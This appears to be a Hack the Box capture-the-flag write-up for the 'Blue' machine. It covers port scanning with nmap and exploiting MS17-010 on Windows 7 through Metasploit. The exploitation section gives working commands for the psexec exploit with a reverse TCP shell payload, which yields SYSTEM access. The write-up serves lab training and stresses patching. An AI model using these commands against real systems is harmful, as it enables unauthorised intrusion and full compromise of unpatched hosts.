# Machine: Blue

## Overview

This write-up details my approach to compromising the "Blue" machine on Hack the Box. This machine is a Windows 7 Professional Service Pack 1 system, vulnerable to the infamous MS17-010 exploit. Below are the steps I followed to successfully exploit the machine and obtain the necessary flags.

## Steps to Compromise the Machine

### 1. Setup and Reconnaissance

Port scanning:

```bash
nmap -sS -p- -v <IP> -oN full_ports.txt -oX full_ports.xml
```

This command performs a SYN scan on all ports. The scan revealed the following open ports:

```bash
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
```
### 2. Detailed Service Scan

I extracted the open ports and saved them in a well-formatted list:

```bash
awk 'BEGIN{FS="/";ORS=","} {print $1}' full_ports.txt > all_ports
```

I performed a version and script scan:

```bash
nmap -sV -sC -p $(cat all_ports) <IP> -oN v_ports.txt -oX v_ports.xml
```

This command performs a version and script scan on the identified open ports, providing detailed information about the target system.

### 3. Vulnerability Analysis

The detailed scan identified the target system as Windows 7 Professional Service Pack 1, with SMB enabled:

```bash
Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-09T09:24:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-09T08:24:41
|_  start_date: 2024-06-09T03:29:22
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 0s
```
### 4. Exploitation

Setting up Metasploit:

```bash
systemctl start postgresql && msfconsole
workspace -a htb-blue
db_import v_ports.xml
```

Checking Vulnerability with MS17-010:

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <IP>
run
```

The target was confirmed to be vulnerable to MS17-010.

Exploiting with MS17-010:

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <IP>
set PAYLOAD windows/shell/reverse_tcp
run
```

This successfully provided a reverse shell on the target system.

### 5. Post-Exploitation

Privilege Escalation:

```bash
whoami
```

Confirmed privileges as NT AUTHORITY\SYSTEM.

## Flag Capture:

Located and captured the user and root flags:

* User Flag: user.txt
* Root Flag: root.txt

## Conclusion

Compromising the Blue machine involved identifying open ports, analyzing the target system, and exploiting the MS17-010 vulnerability. This exercise reinforced the importance of regular patching and provided practical experience with a well-known Windows exploit.

***
